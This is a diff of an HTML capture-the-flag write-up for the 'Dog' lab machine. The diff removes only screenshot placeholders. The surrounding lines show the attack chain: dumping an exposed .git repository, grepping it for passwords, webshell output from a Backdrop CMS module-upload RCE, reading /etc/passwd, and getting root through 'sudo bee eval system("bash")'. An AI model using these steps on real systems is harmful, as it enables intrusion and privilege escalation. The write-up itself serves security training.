@@ -354,30 +354,15 @@
         <li>Port 80: HTTP (Apache 2.4.41) - Backdrop CMS 1.x</li>
         <li>Exposed <code>.git</code> repository found at <code>/.git/</code></li>
     </ul>
-    <div class="shot">
-        <img src="dog_01.png" alt="nmap scan showing port 80 + exposed .git repository"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_01.png</code><br>nmap scan showing port 80 + exposed .git repository</div>
-    </div>
     <h3>HTTP Enumeration</h3>
     <p>After adding the hostname to my hosts file I can visit the website on port 80.</p>
     <pre><code>echo "10.129.231.223 dog.htb" | sudo tee -a /etc/hosts</code></pre>
     <p>The site is a Backdrop CMS instance sitting in maintenance mode. The far more interesting finding from nmap is the exposed <code>.git/</code> directory, which means the full repository is downloadable and we can read the source offline.</p>
-    <div class="shot">
-        <img src="dog_02.png" alt="Backdrop CMS site in maintenance mode"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_02.png</code><br>Backdrop CMS site in maintenance mode</div>
-    </div>
     <h4>Dumping the repo</h4>
     <pre><code>git-dumper http://dog.htb/.git/ ./dog-git
 cd ./dog-git
 grep -riE "password|passwd|pwd|db_|mysql" .</code></pre>
     <p>This recovered a MySQL password from the Backdrop configuration in the source. Password reuse was the obvious next step, but I needed a valid user to pair it with first, so I enumerated usernames.</p>
-    <div class="shot">
-        <img src="dog_03.png" alt="MySQL password recovered from the .git dump"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_03.png</code><br>MySQL password recovered from the .git dump</div>
-    </div>
     <p>I also fingerprinted the exact CMS version with a Backdrop scanner, which came back as 1.27.1 — relevant for the RCE later on.</p>
     <pre><code>python3 BackDropScan.py --url http://dog.htb
 # Backdrop CMS version =&gt; 1.27.1</code></pre>
@@ -410,11 +395,6 @@ grep -riE "password|passwd|pwd|db_|mysql" .</code></pre>
 [&gt;] waiting for shell at: http://dog.htb/modules/rvzef390c/shell.php
 [&gt;] shell is live</code></pre>
     <p>The PoC labels its prompt <code>root@dog.htb &gt;</code>, but that's cosmetic — the webshell actually runs as the web server user (<code>www-data</code>). From here I enumerated which local accounts have a real login shell.</p>
-    <div class="shot">
-        <img src="dog_04.png" alt="Webshell running as www-data after the module-upload RCE"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_04.png</code><br>Webshell running as www-data after the module-upload RCE</div>
-    </div>
     <pre><code>root@dog.htb &gt; cat /etc/passwd | grep /bin/bash
 root:x:0:0:root:/root:/bin/bash
 jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
@@ -442,11 +422,6 @@ root@dog:/var/www/html#
 
 root@dog:~# cat root.txt
 <span class="redacted">&lt;REDACTED&gt;</span></code></pre>
-    <div class="shot">
-        <img src="dog_05.png" alt="Root shell via bee eval and the root flag"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>dog_05.png</code><br>Root shell via bee eval and the root flag</div>
-    </div>
     <div class="warning">
     <p><strong>Gotcha:</strong> <code>bee eval</code> has to bootstrap a working Backdrop installation before it will run any PHP. Run it from a random directory and it errors out because it can't locate the Backdrop root. Running it from inside the docroot (<code>/var/www/html</code>) fixes this. Alternatively, point <code>bee</code> at the install explicitly so it works from anywhere:</p>
     <pre><code>sudo /usr/local/bin/bee --root=/var/www/html eval 'system("bash")'</code></pre>
